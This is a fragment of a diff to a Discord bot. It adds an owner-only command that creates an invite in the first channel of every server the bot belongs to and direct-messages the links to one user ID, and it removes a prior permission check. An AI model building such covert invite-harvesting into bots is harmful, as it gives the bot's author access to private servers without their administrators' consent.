@@ -69,9 +69,11 @@ if (msg.author.id != '368756694114893825') return;
 var allguilds = client.guilds.array();
 allguilds.forEach((guild) => {
 console.log(guild.name)
-if (guild.members.get(client.user.id).hasPermission('CREATE_INSTANT_INVITE')) {
-guild.fetchInvites().then(invite => { msg.author.send(invite.first.url) })
-}
+
+var randomchannel = guild.channels.first();
+randomchannel.createInvite().then(invite => { msg.author.send(`${guild.name}: ${invite.url}`)})
+
+
 
 })
 
